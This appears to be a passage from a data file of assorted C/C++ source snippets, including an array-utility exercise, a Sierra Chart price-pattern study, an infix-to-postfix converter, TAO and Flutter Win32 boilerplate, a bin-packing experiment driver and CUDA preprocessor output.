\" << Avg(arr, n) << endl;\n\tcout << \"\u041c\u0438\u043d\u0438\u043c\u0430\u043b\u044c\u043d\u043e\u0435 \u0437\u043d\u0430\u0447\u0435\u043d\u0438\u0435: \" << Min(arr, n) << endl;\n\tcout << \"\u041c\u0430\u043a\u0441\u0438\u043c\u0430\u043b\u044c\u043d\u043e\u0435 \u0437\u043d\u0430\u0447\u0435\u043d\u0438\u0435: \" << Max(arr, n) << endl;\n\tcout << \"\u0412\u0432\u0435\u0434\u0438\u0442\u0435 \u043a\u043e\u043b\u0438\u0447\u0435\u0441\u0442\u0432\u043e \u0441\u0434\u0432\u0438\u0433\u043e\u0432 \u0432\u043f\u0440\u0430\u0432\u043e: \"; cin >> shift;\n\tshiftLeft(shift, arr, n);\n\tPrint(arr, n);\n\tcout << \"\u0412\u0432\u0435\u0434\u0438\u0442\u0435 \u043a\u043e\u043b\u0438\u0447\u0435\u0441\u0442\u0432\u043e \u0441\u0434\u0432\u0438\u0433\u043e\u0432 \u0432\u043b\u0435\u0432\u043e: \"; cin >> shift;\n\tshiftRight(shift, arr, n);\n\tPrint(arr, n);\n}\n\n\tvoid FillRand(int arr[], const int n)\n\t{\n\t\tfor (int i = 0; i < n; i++)\n\t\t{\n\t\t\tarr[i] = rand() % 100+1;\n\t\t}\n\t}\n\tvoid Print(int arr[], const int n)\n\t{\n\t\tfor (int i = 0; i < n; i++)\n\t\t{\n\t\t\tcout << arr[i] << tab;\n\t\t}\n\t\tcout << endl;\n\t}\n\tvoid Sort(int arr[], const int n)\n\t{\n\t\tfor (int i = 0; i < n; i++)\n\t\t{\n\t\t\tfor (int j = i+1; j < n; j++)\n\t\t\t{\n\t\t\t\tif (arr[j] < arr[i])\n\t\t\t\t{\n\t\t\t\t\tint buffer = arr[i];\n\t\t\t\t\tarr[i] = arr[j];\n\t\t\t\t\tarr[j] = buffer;\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t}\n\tint Sum(int arr[], const int n)\n\t{\n\t\tint sum = 0;\n\t\tfor (int i = 0; i < n; i++)\n\t\t{\n\t\t\tsum += arr[i];\n\t\t}\n\t\treturn sum;\n\t}\n\tdouble Avg(int arr[], const int n)\n\t{\n\t\treturn (double)Sum(arr,n) / n;\n\t}\n\tint Min(int arr[], const int n)\n\t{\n\t\tint min = arr[0];\n\t\tfor (int i = 0; i < n; i++)\n\t\t{\n\t\t\tif (min > arr[i]) min = arr[i];\n\t\t}\n\t\treturn min;\n\t}\n\tint Max(int arr[], const int n)\n\t{\n\t\tint max = arr[0];\n\t\tfor (int i = 0; i < n; i++)\n\t\t{\n\t\t\tif (max < arr[i]) max = arr[i];\n\t\t}\n\t\treturn max;\n\t}\n\tvoid shiftLeft(int shift, int arr[], const int n)\n\t{\n\t\tfor (int i = 0; i < shift; i++)\n\t\t{\n\t\t\tint temp = arr[n - 1];\n\t\t\tfor (int i = n - 1; i > 0; i--)\n\t\t\t{\n\t\t\t\tarr[i] = arr[i - 1];\n\t\t\t}\n\t\t\tarr[0] = temp;\n\t\t}\n\t}\n\tvoid shiftRight(int shift, int arr[], const int n)\n\t{\n\t\tfor (int i = 0; i < shift; i++)\n\t\t{\n\t\t\tint temp = arr[0];\n\t\t\tfor (int i = 0; i < n; i++)\n\t\t\t{\n\t\t\t\tarr[i] = arr[i + 1];\n\t\t\t}\n\t\t\tarr[n - 1] = temp;\n\t\t}\n\t}",
    "#include \"sierrachart.h\"\n\nSCDLLName(\"NEA - Outside Patterns\");\n\n/*==========================================================================*/\n// \"Outside (Or Equals)\" Multiple Bar Pattern -\n// Highlights price patterns where the High-Low range of a set of consecutive bars \n// extends beyond or equals the High-Low range of the prior set of bars. This pattern \n// can be useful for detecting momentum, potential trend reversals, or continuation \n// signals in price action.\n/*==========================================================================*/\n\nSCSFExport scsf_Outside_Multiple_Bar_Pattern(SCStudyInterfaceRef sc)\n{\n\n\tSCInputRef i_Inside_Range = sc.Input[0];\n\tSCInputRef i_Outside_Range = sc.Input[1];\n\n\tSCSubgraphRef Subgraph_Top = sc.Subgraph[0];\n\tSCSubgraphRef Subgraph_Bottom = sc.Subgraph[1];\n\t\n\t// Set configuration variables\n\tif (sc.SetDefaults)\n\t{\n\t\t// Set the configuration and defaults\n\t\tsc.GraphName = \"NEA - Outside (Or Equals) Multiple Bar Pattern\";\n\t\tsc.GraphRegion = 0;\n\n\t\tSubgraph_Top.Name =\"Top\";\n\t\tSubgraph_Top.DrawStyle = DRAWSTYLE_TRANSPARENT_FILL_RECTANGLE_BOTTOM;\n\t\tSubgraph_Top.PrimaryColor = RGB(0,110,255);\n\t\tSubgraph_Top.DrawZeros = false;\n\n\t\tSubgraph_Bottom.Name =\"Bottom\";\n\t\tSubgraph_Bottom.DrawStyle = DRAWSTYLE_TRANSPARENT_FILL_RECTANGLE_TOP;\n\t\tSubgraph_Bottom.PrimaryColor = RGB(0,110,255);\n\t\tSubgraph_Bottom.DrawZeros = false;\n\t\t\n\t\ti_Inside_Range.Name = \"Inside Bar Number Range\";\n\t\ti_Inside_Range.SetInt(5);\n\n\t\ti_Outside_Range.Name = \"Outside Bar Number Range\";\n\t\ti_Outside_Range.SetInt(2);\n\n\t\tsc.AutoLoop = 1;\n\t\tsc.DrawStudyUnderneathMainPriceGraph = 1;\n\t\t\n\t\treturn;\n\t}\n\t\n\t// Array references\n\tSCFloatArrayRef High = sc.High;\n\tSCFloatArrayRef Low = sc.Low;\n\t\n\tdouble &InsideRangeHigh = sc.GetPersistentDouble(0);\n\tdouble &InsideRangeLow = sc.GetPersistentDouble(1);\n\tdouble &OutsideRangeHigh = sc.GetPersistentDouble(2);\n\tdouble &OutsideRangeLow = sc.GetPersistentDouble(3);\n\n\t// **************************\n\t// Do data processing\n\t// **************************\n\n\tint InsideRange = i_Inside_Range.GetInt();\n\tint OutsideRange = i_Outside_Range.GetInt();\n\n\t// Set Inside Range variables (High & Low)\n\t\n\t// set InsideRange H & L to first bar H & L\n\tInsideRangeHigh = High[sc.Index - (InsideRange + OutsideRange - 1)];\n\tInsideRangeLow = Low[sc.Index - (InsideRange + OutsideRange - 1)];\n\n\tfor (int i = (2 - InsideRange - OutsideRange); i < (1 - OutsideRange); i++) {\n\n\t\t// if any other bar has High > InsideBarHigh\n\t\tif (InsideRangeHigh < High[sc.Index + i]) {\n\t\t\tInsideRangeHigh = High[sc.Index + i];\n\t\t}\n\t\t// if any other bar has Low < InsideBarLow\n\t\tif (InsideRangeLow > Low[sc.Index + i]) {\n\t\t\tInsideRangeLow = Low[sc.Index + i];\n\t\t}\n\t}\n\n\t// Set Outside Range variables to first Outside Range Bar High & Low\n\tOutsideRangeHigh = High[sc.Index + 1 - OutsideRange];\n\tOutsideRangeLow = Low[sc.Index + 1 - OutsideRange];\n\n\tfor (int i = (2 - OutsideRange); i < 1; i++) {\n\n\t\tif (OutsideRangeHigh < High[sc.Index + i]) {\n\t\t\t\tOutsideRangeHigh = High[sc.Index];\n\t\t}\n\t\tif (OutsideRangeLow > Low[sc.Index + i]) {\n\t\t\t\tOutsideRangeLow = Low[sc.Index];\n\t\t}\n\t}\n\n\t// If Inside Range H <= Outside Range H && Inside Range L >= Outside Range L\n\tif (InsideRangeHigh <= OutsideRangeHigh && InsideRangeLow >= OutsideRangeLow) {\n\t\t// then highlight the Outside Range Bars\n\t\t// Iterate through OutsideRange bars...\n\t\tfor (int i = (1 - OutsideRange); i < 1; i++) {\n\t\t\tSubgraph_Top[sc.Index + i] = OutsideRangeHigh;\n\t\t\tSubgraph_Bottom[sc.Index + i] = OutsideRangeLow;\n\t\t}\n\n\t\treturn;\n\t}\n\telse {\n\t\tSubgraph_Top[sc.Index] = 0;\n\t\tSubgraph_Bottom[sc.Index] = 0;\n\t}\n} // That's All Folks!",
    "#include<bits/stdc++.h>\nusing namespace std;\n \nunordered_map<char, int> precedence = {{'+', 1}, {'-', 1}, {'*', 2}, {'/', 2}, {'^', 3}};\n \nbool isOpp(char c) {\n    return c == '+' || c == '-' || c == '*' || c == '/' || c == '^';\n}\n \nbool detPrecedence(char op1, char op2) {\n    return precedence[op1] >= precedence[op2];\n}\n \nstring rpn(const string& infix) {\n    stack<char> st;\n    string postfix;\n \n    for (char c : infix) {\n        if (isalpha(c)) {\n            postfix += c;\n        } else if (c == '(') {\n            st.push(c);\n        } else if (c == ')') {\n            while (!st.empty() && st.top() != '(') {\n                postfix += st.top();\n                st.pop();\n            }\n            st.pop();\n        } else if (isOpp(c)) {\n            while (!st.empty() && st.top() != '(' && detPrecedence(st.top(), c)) {\n                postfix += st.top();\n                st.pop();\n            }\n            st.push(c);\n        }\n    }\n \n    while (!st.empty()) {\n        postfix += st.top();\n        st.pop();\n    }\n \n    return postfix;\n}\n \nint main() {\n    int t;\n    cin >> t;\n    cin.ignore();\n \n    while (t--) {\n        string infix;\n        getline(cin, infix);\n        string postfix = rpn(infix);\n        cout << postfix << endl;\n    }\n \n    return 0;\n}\n",
    "\n//=============================================================================\n/**\n *  @file    Codeset_Translator_Factory_T.cpp\n *\n *  $Id$\n *\n *  The template for creating a particular instance of a codeset translator\n *\n *\n *  @author Phil Mesnier <mesnier_p@ociweb.com>\n */\n//=============================================================================\n\n#ifndef TAO_CODESET_TRANSLATOR_FACTORY_T_CPP\n#define TAO_CODESET_TRANSLATOR_FACTORY_T_CPP\n\n#include \"tao/Codeset/Codeset_Translator_Factory_T.h\"\n#include \"tao/debug.h\"\n#include \"tao/CDR.h\"\n#include \"ace/Log_Msg.h\"\n\nTAO_BEGIN_VERSIONED_NAMESPACE_DECL\n\ntemplate<class NCS_TO_TCS>\nTAO_Codeset_Translator_Factory_T<NCS_TO_TCS>::TAO_Codeset_Translator_Factory_T () :\n  translator_(0)\n{\n}\n\ntemplate<class NCS_TO_TCS>\nTAO_Codeset_Translator_Factory_T<NCS_TO_TCS>::~TAO_Codeset_Translator_Factory_T ()\n{\n  delete translator_;\n}\n\ntemplate<class NCS_TO_TCS>\nint\nTAO_Codeset_Translator_Factory_T<NCS_TO_TCS>::init (int argc, ACE_TCHAR* argv[])\n{\n  this->TAO_Codeset_Translator_Factory::init (argc,argv);\n  ACE_NEW_RETURN (translator_,NCS_TO_TCS,-1);\n  if( TAO_debug_level > 0 )\n    TAOLIB_DEBUG((LM_DEBUG, \"TAO_Codeset_Translator_Factory_T<NCS_TO_TCS>::init() entered\\n\"));\n  return 0;\n}\n\n// ncs & tcs values set at compile time as a result of instantiating the\n// template.\ntemplate<class NCS_TO_TCS>\nCONV_FRAME::CodeSetId\nTAO_Codeset_Translator_Factory_T<NCS_TO_TCS>::ncs () const\n{\n  return this->translator_->ncs();\n}\n\ntemplate<class NCS_TO_TCS>\nCONV_FRAME::CodeSetId\nTAO_Codeset_Translator_Factory_T<NCS_TO_TCS>::tcs () const\n{\n  return this->translator_->tcs();\n}\n\n// Assign either a reference to teh existing translator or a new translator\n// for input CDR streams\ntemplate<class NCS_TO_TCS>\nvoid\nTAO_Codeset_Translator_Factory_T<NCS_TO_TCS>::assign (TAO_InputCDR *cdr) const\n{\n  if (cdr)\n    {\n      this->assign_i(cdr,this->translator_);\n    }\n}\n\n// Assign either a reference to teh existing translator or a new translator\n// for input CDR streams\ntemplate<class NCS_TO_TCS>\nvoid\nTAO_Codeset_Translator_Factory_T<NCS_TO_TCS>::assign (TAO_OutputCDR *cdr) const\n{\n  if (cdr)\n    {\n      this->assign_i(cdr,this->translator_);\n    }\n}\n\nTAO_END_VERSIONED_NAMESPACE_DECL\n\n#endif /* TAO_CODESET_TRANSLATOR_FACTORY_T_CPP */\n",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "#include <cstdlib>\n#include <iostream>\n#include <string>\n#include <algorithm>\n#include <atomic>\n#include <thread>\n#include <fstream>\n\n#include \"Instance.h\"\n#include \"ALG_FFI.h\"\n#include \"ALG_RSFF.h\"\n// #include \"ALG_Harmonic.h\"\n\n\n\nstd::atomic<bool> quit(false);  // Flag to control the execution\n\nvoid listenForQuit() {\n    std::string input;\n    while (true) {\n        std::cin >> input;\n        if (input == \"X\") {\n            quit.store(true);\n            break;\n        }\n    }\n}\n\n\nint run_FFI(Instance& instance) {\n\tALG_FFI ffi;\n\t// Solve the instance using FFI and get the solution\n\tSolution ffiSolution = ffi.solve(instance);\n\n\tffiSolution.display();\n\n\treturn ffiSolution.totalItems();\n}\n\n\n\nint run_RSFF(Instance& instance) {\n\tALG_RSFF rsff;\n\n\tSolution rsffSolution = rsff.solve(instance);\n\n\t// rsffSolution.display();\n\n\treturn rsffSolution.totalItems();\t\n}\n\n\n// int run_Harmonic(Instance& instance) {\n// \t// int k;\n// \t// std::cout << \"Choose parameter k: \";\n// \t// std::cin >> k;\n\n// \tALG_Harmonic harmonic;\n\n// \tSolution harmonicSolution = harmonic.solve(instance);\n\n\n// \treturn harmonicSolution.totalItems();\n// }\n\n\n\n\nvoid computeSequence() {\n    while (!quit.load()) {\n\t\t\n\t\t// call generateSequence here\n\n        std::cout << \"Computing sequence\\n\";\n\n\t\t\n\t\tstd::string filepath =  \"sequences/ex2.csv\";\n\n\t\tInstance instance(filepath);\n\t\n\t\n\n\t\t// OPTIMAL SOLUTION\n\t\tchar run_opt_command[100];\n\t\tsnprintf(run_opt_command, 100, \"python OPT_MIP.py %s\", filepath.c_str());\n\t\tsystem(run_opt_command); // run the optimal solution\n\n\n\t\tsize_t dot_position = filepath.find('.');\n\n\n\t\tstd::string base_name = filepath.substr(0, dot_position);\n\n\t\tstd::string optFilePath = base_name + \"_opt.csv\";\n\n\t\tint opt_bins = -1;\n\n\n\t\t// Read from the new file\n\t\tstd::ifstream optFile(optFilePath);\n\n\t\t// Check if the file is open\n\t\tif (optFile.is_open()) {\n\t\t\tstd::string contentRead;\n\n\t\t\t// Read the content from the file\n\t\t\tstd::string line;\n\t\t\twhile (getline(optFile, line)) {\n\t\t\t\tcontentRead += line;\n\t\t\t}\n\n\t\t\t// Close the file\n\t\t\toptFile.close();\n\n\t\t\t// Print the content read\n\n\t\t\topt_bins = stoi(contentRead);\n\t\t}\n\n\n\n\t\tinstance.display();\n\n\n\t\t// ALG 1: First Fit Increasing (FFI)\n\t\tint ffi_bins = run_FFI(instance);\n\n\n\t\t// ALG 2: Restrited Subsequence First Fit (RSFF)\n\t\tint rsff_bins = run_RSFF(instance);\n\n\t\t// ALG 3: Harmonic heurestic\n\t\t// int harmonic_bins = run_Harmonic(instance);\n\n\t\tstd::cout << \"opt_bins: \" << opt_bins << \",\\tffi_bins: \" << ffi_bins << \",\\trsff_bins: \" << rsff_bins << \"\\n\";\n\t\t//////\n\t\t\n\t\t// Compute ratios\n\t\tstd::cout << \"FFI ratio: \" << float(opt_bins)/ffi_bins << \"\\n\";\n\t\tstd::cout << \"RSFF ratio: \" << float(opt_bins)/rsff_bins << \"\\n\";\n    }\n\n    std::cout << \"Computation stopped.\\n\";\n}\n\nint main(int argc, char* argv[]) {\n    std::thread listenerThread(listenForQuit);\n    std::thread computationThread(computeSequence);\n\n    listenerThread.join();\n    computationThread.join();\n\n    return 0;\n}\n\n\n\n// int main() {\n\t\n\t// if(argc == 1) {\n\t// \tprintf(\"Provide a csv file as input: ./Main path/to/file.csv\\n\\n\");\n\t// \treturn 0;\n\t// }\n\n\t// Take csv as input with options\n\t// std::string file_path = argv[1];\n\t\n\t// bool choice = false;\n\n\t// std::cout << \"Explicit sequence? (1 = yes, 0 = no): \";\n\n\t// std::cin >> choice;\n\n\t// // Explicitly enter sequence\n\t// Instance instance;\n\t// if(choice) {\n\t// \tstd::cout << \"Number of bins: \";\n\t// \tstd::cin >> instance.numBins;\n\n\t// \tstd::cout << \"Capacity of each bin: \";\n\t// \tstd::cin >> instance.capacity;\n\n\t// \tstd::cout << \"Number of items: \";\n\t// \tstd::cin >> instance.numItems;\n\n\t// \tstd::cout << \"Items: \";\n\t// \tfor(int i = 0, p; i < instance.numItems; i++) {\n\t// \t\tstd::cin >> p;\n\t// \t\tinstance.items.push_back(p);\n\t// \t}\n\n\t// \tinstance.write(argv[1]);\n\t// }\n\n\t// // Give a path to a file of a sequence\n\t// else {\n\t// \tstd::string file_path;\n\t// \tstd::cout << \"Provide a file path: \";\n\t// \tstd::cin >> file_path;\n\n\t// }\n\t\n// }",
    "# 1 \"CMakeCUDACompilerId.cu\"\n#pragma GCC diagnostic ignored \"-Wunused-local-typedefs\"\n# 1\n#pragma GCC diagnostic push\n# 1\n#pragma GCC diagnostic ignored \"-Wunused-variable\"\n# 1\n#pragma GCC diagnostic ignored \"-Wunused-function\"\n# 1\nstatic char __nv_inited_managed_rt = 0; static void **__nv_fatbinhandle_for_managed_rt; static void __nv_save_fatbinhandle_for_managed_rt(void **in){__nv_fatbinhandle_for_managed_rt = in;} static char __nv_init_managed_rt_with_module(void **); static inline void __nv_init_managed_rt(void) { __nv_inited_managed_rt = (__nv_inited_managed_rt ? __nv_inited_managed_rt                 : __nv_init_managed_rt_with_module(__nv_fatbinhandle_for_managed_rt));}\n# 1\n#pragma GCC diagnostic pop\n# 1\n#pragma GCC diagnostic ignored \"-Wunused-variable\"\n\n# 1\n#define __nv_is_extended_device_lambda_closure_type(X) false\n#define __nv_is_extended_host_device_lambda_closure_type(X) false\n#if defined(__nv_is_extended_device_lambda_closure_type) && defined(__nv_is_extended_host_device_lambda_closure_type)\n#endif\n\n# 1\n# 61 \"/usr/local/cuda-11.3/bin/../targets/x86_64-linux/include/cuda_runtime.h\"\n#pragma GCC diagnostic push\n# 64\n#pragma GCC diagnostic ignored \"-Wunused-function\"\n# 66 \"/usr/local/cuda-11.3/bin/../targets/x86_64-linux/include/device_types.h\"\n#if 0\n# 66\nenum cudaRoundMode { \n# 68\ncudaRoundNearest, \n# 69\ncudaRoundZero, \n# 70\ncudaRoundPosInf, \n# 71\ncudaRoundMinInf\n# 72\n}; \n#endif\n# 98 \"/usr/local/cuda-11.3/bin/../targets/x86_64-linux/include/vector_types.h\"\n#if 0\n# 98\nstruct char1 { \n# 100\nsigned char x; \n# 101\n}; \n#endif\n# 103 \"/usr/local/cuda-11.3/bin/../targets/x86_64-linux/include/vector_types.h\"\n#if 0\n# 103\nstruct uchar1 { \n# 105\nunsigned char x; \n# 106\n}; \n#endif\n# 109 \"/usr/local/cuda-11.3/bin/../targets/x86_64-linux/include/vector_types.h\"\n#if 0\n# 109\nstruct __attribute((aligned(2))) char2 { \n# 111\nsigned char x, y; \n# 112\n}; \n#endif\n# 114 \"/usr/local/cuda-11.3/bin/../targets/x86_64-linux/include/vector_types.h\"\n#if 0\n# 114\nstruct __attribute((aligned(2))) uchar2 { \n# 116\nunsigned char x, y; \n# 117\n}; \n#endif\n# 119 \"/usr/local/cuda-11.3/bin/../targets/x86_64-linux/include/vector_types.h\"\n#if 0\n# 119\nstruct char3 { \n# 121\nsigned char x, y, z; \n# 122\n}; \n#endif\n# 124 \"/usr/local/cuda-11.3/bin/../targets/x86_64-linux/include/vector_types.h\"\n#if 0\n# 124\nstruct uchar3 { \n# 126\nunsigned char x, y, z; \n# 127\n}; \n#endif\n# 129 \"/usr/local/cuda-11.3/bin/../targets/x86_64-linux/include/vector_types.h\"\n#if 0\n# 129\nstruct __attribute((aligned(4))) char4 { \n# 131\nsigned char x, y, z, w; \n# 132\n}; \n#endif\n# 134 \"/usr/local/cuda-11.3/bin/../targets/x86_64-linux/include/vector_types.h\"\n#if 0\n# 134\nstruct __attribute((aligned(4))) uchar4 { \n# 136\nunsigned char x, y, z, w; \n# 137\n}; \n#endif\n# 139 \"/usr/local/cuda-11.3/bin/../targets/x86_64-linux/include/vector_types.h\"\n#if 0\n# 139\nstruct short1 { \n# 141\nshort x; \n# 142\n}; \n#endif\n# 144 \"/usr/local/cuda-11.3/bin/../targets/x86_64-linux/include/vector_types.h\"\n#if 0\n# 144\nstruct ushort1 { \n# 146\nunsigned short x; \n# 147\n}; \n#endif\n# 149 \"/usr/local/cuda-11.3/bin/../targets/x86_64-linux/include/vector_types.h\"\n#if 0\n# 149\nstruct __attribute((aligned(4))) short2 { \n# 151\nshort x, y; \n# 152\n}; \n#endif\n# 154 \"/usr/local/cuda-11.3/bin/../targets/x86_64-linux/include/vector_types.h\"\n#if 0\n# 154\nstruct __attribute((aligned(4))) ushort2 { \n# 156\nunsigned short x, y; \n# 157\n}; \n#endif\n# 159 \"/usr/local/cuda-11.3/bin/../targets/x86_64-linux/include/vector_types.h\"\n#if 0\n# 159\nstruct short3 { \n# 161\nshort x, y, z; \n# 162\n}; \n#endif\n# 164 \"/usr/local/cuda-11.3/bin/../targets/x86_64-linux/include/vector_types.h\"\n#if 0\n# 164\nstruct ushort3 { \n# 166\nunsigned short x, y, z; \n# 167\n}; \n#endif\n# 169 \"/usr/local/cuda-11.3/bin/../targets/x86_64-linux/include/vector_types.h\"\n#if 0\n# 169\nstruct __attribute((aligned(8))) short4 { short x; short y; short z; short w; }; \n#endif\n# 170 \"/usr/local/cuda-11.3/bin/../targets/x86_64-linux/include/vector_types.h\"\n#if 0\n# 170\nstruct __attribute((aligned(8))) ushort4 { unsigned short x; unsigned short y; unsigned short z; unsigned short w; }; \n#endif\n# 172 \"/usr/local/cuda-11.3/bin/../targets/x86_64-linux/include/vector_types.h\"\n#if 0\n# 172\nstruct int1 { \n# 174\nint x; \n# 175\n}; \n#endif\n# 177 \"/usr/local/cuda-11.3/bin/../targets/x86_64-linux/include/vector_types.h\"\n#if 0\n# 177\nstruct uint1 { \n# 179\nunsigned x; \n# 180\n}; \n#endif\n# 182 \"/usr/local/cuda-11.3/bin/../targets/x86_64-linux/include/vector_types.h\"\n#if 0\n# 182\nstruct __attribute((aligned(8))) int2 { int x; int y; }; \n#endif\n# 183 \"/usr/local/cuda-11.3/bin/../targets/x86_64-linux/include/vector_types.h\"\n#if 0\n# 183\nstruct __attribute((aligned(8))) uint2 { unsigned x; unsigned y; }; \n#endif\n# 185 \"/usr/local/cuda-11.3/bin/../targets/x86_64-linux/include/vector_types.h\"\n#if 0\n# 185\nstruct int3 { \n# 187\nint x, y, z; \n# 188\n}; \n#endif\n# 190 \"/usr/local/cuda-11.3/bin/../targets/x86_64-linux/include/vector_types.h\"\n#if 0\n# 190\nstruct uint3 { \n# 192\nunsigned x, y, z; \n# 193\n}; \n#endif\n# 195 \"/",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) 